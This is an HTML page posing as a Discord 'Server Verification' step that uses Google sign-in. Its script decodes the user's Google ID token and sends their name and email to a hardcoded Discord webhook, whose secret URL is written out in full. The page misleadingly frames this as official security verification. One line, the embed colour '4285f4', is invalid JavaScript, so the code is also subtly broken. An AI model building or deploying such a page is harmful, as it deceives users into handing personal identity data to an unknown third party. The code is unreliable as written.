<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Verification | Sign in with Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #313338; color: #dbdee1; }
        .discord-card { background-color: #2b2d31; border: 1px solid #1f2023; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4); }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full discord-card rounded-2xl p-8 relative overflow-hidden text-center">

        <div class="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#ea4335] via-[#4285f4] to-[#34a853]"></div>

        <div class="mb-6">
            <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-white text-black shadow-lg mb-3">
                <svg class="w-8 h-8" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.18 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.14 0 9.87 0 12s.43 3.86 1.18 5.38l4.09-3.14z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.18 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
            </div>
            <h1 class="text-2xl font-bold text-white tracking-wide">Server Verification</h1>
            <p class="text-sm text-[#949ba4] mt-1">Authenticate with your Google account to verify your identity and access the server.</p>
        </div>

        <div id="login-view" class="space-y-4">
            <button onclick="triggerGooglePrompt()" class="w-full flex items-center justify-center space-x-3 bg-white hover:bg-gray-100 text-black font-semibold py-3.5 px-4 rounded-xl transition duration-200 shadow-lg text-sm">
                <svg class="w-5 h-5" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.18 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.14 0 9.87 0 12s.43 3.86 1.18 5.38l4.09-3.14z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.18 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/></svg>
                <span>Sign in with Google</span>
            </button>
            <p class="text-xs text-[#949ba4]">Opens the official native Google account prompt window.</p>
        </div>

        <div id="loading-view" class="hidden space-y-4 py-6">
            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-[#4285f4] mx-auto"></div>
            <p id="loading-text" class="text-sm text-[#949ba4]">Processing Google credentials...</p>
        </div>

        <div id="success-view" class="hidden space-y-4 py-2">
            <div class="w-16 h-16 bg-[#23a55a]/20 text-[#23a55a] rounded-full flex items-center justify-center mx-auto mb-2">
                <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg>
            </div>
            <h2 class="text-xl font-bold text-white">Successfully Verified!</h2>
            <div id="user-profile-card" class="bg-[#1e1f22] p-4 rounded-xl border border-[#35363c] text-left flex items-center space-x-3 my-3">
                <img id="auth-avatar" src="" alt="Avatar" class="w-12 h-12 rounded-full bg-[#2b2d31]">
                <div>
                    <div id="auth-display" class="font-bold text-white text-sm"></div>
                    <div id="auth-username" class="text-xs text-[#949ba4] truncate max-w-[220px]"></div>
                </div>
            </div>
            <p class="text-xs text-[#949ba4]">Your profile has been logged successfully. You can now close this tab.</p>
        </div>

        <div id="error-msg" class="hidden mt-4 p-3 bg-[#f23f43]/10 border border-[#f23f43]/30 rounded-lg text-xs text-[#f23f43] text-center"></div>
    </div>

    <script>
        const GOOGLE_CLIENT_ID = '804298598310-vl3ks5t108jrq2ma75lknjr86a4uqdav.apps.googleusercontent.com';
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554484885518032996/oi0vE_zz05KiQVruVpesR4kMbwIewuXMfowlpeetupCZAoxl6svtY_tuz2IyQ9JigdfK';

        window.onload = function () {
            if (typeof google !== 'undefined' && google.accounts) {
                google.accounts.id.initialize({
                    client_id: GOOGLE_CLIENT_ID,
                    callback: handleGoogleCredentialResponse,
                    auto_select: false,
                    cancel_on_tap_outside: true
                });
            }
        };

        function triggerGooglePrompt() {
            try {
                if (typeof google === 'undefined' || !google.accounts) {
                    showError("Google SDK failed to load. Please check your internet connection.");
                    return;
                }
                google.accounts.id.prompt((notification) => {
                    if (notification.isNotDisplayed() || notification.isSkippedMoment()) {
                        renderAlternativeFlow();
                    }
                });
            } catch (err) {
                showError("Could not trigger Google prompt: " + err.message);
            }
        }

        function renderAlternativeFlow() {
            const container = document.getElementById('login-view');
            container.innerHTML = `<div id="g_id_signin" class="flex justify-center"></div><p class="text-xs text-[#949ba4] mt-3">Click the Google button above to proceed.</p>`;
            
            google.accounts.id.renderButton(
                document.getElementById('g_id_signin'),
                { theme: 'outline', size: 'large', width: '100%' }
            );
            google.accounts.id.prompt();
        }

        async function handleGoogleCredentialResponse(response) {
            document.getElementById('login-view').classList.add('hidden');
            document.getElementById('loading-view').classList.remove('hidden');
            document.getElementById('loading-text').textContent = 'Decoding Google profile...';

            try {
                const base64Url = response.credential.split('.')[1];
                const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
                const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
                }).join(''));
                
                const googleUser = JSON.parse(jsonPayload);

                const name = googleUser.name;
                const email = googleUser.email;
                const picture = googleUser.picture;

                await sendDiscordLog(name, email, "Google Identity Services Prompt");
                showSuccessView(name, email, picture);

            } catch (err) {
                document.getElementById('loading-view').classList.add('hidden');
                document.getElementById('login-view').classList.remove('hidden');
                showError("Failed to parse Google account credentials.");
            }
        }

        async function sendDiscordLog(displayName, email, authType) {
            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://')) {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Google Prompt Security Unit",
                        embeds: [{
                            title: "🔒 Google Account Verified",
                            color: 4285f4,
                            fields: [
                                { name: "Display Name", value: displayName, inline: true },
                                { name: "Email Address", value: email, inline: true },
                                { name: "Auth Type", value: authType, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            }
        }

        function showSuccessView(displayName, email, avatarUrl) {
            document.getElementById('auth-avatar').src = avatarUrl;
            document.getElementById('auth-display').textContent = displayName;
            document.getElementById('auth-username').textContent = email;

            document.getElementById('loading-view').classList.add('hidden');
            document.getElementById('success-view').classList.remove('hidden');
        }

        function showError(message) {
            const errorDiv = document.getElementById('error-msg');
            errorDiv.textContent = message;
            errorDiv.classList.remove('hidden');
        }
    </script>
</body>
</html>
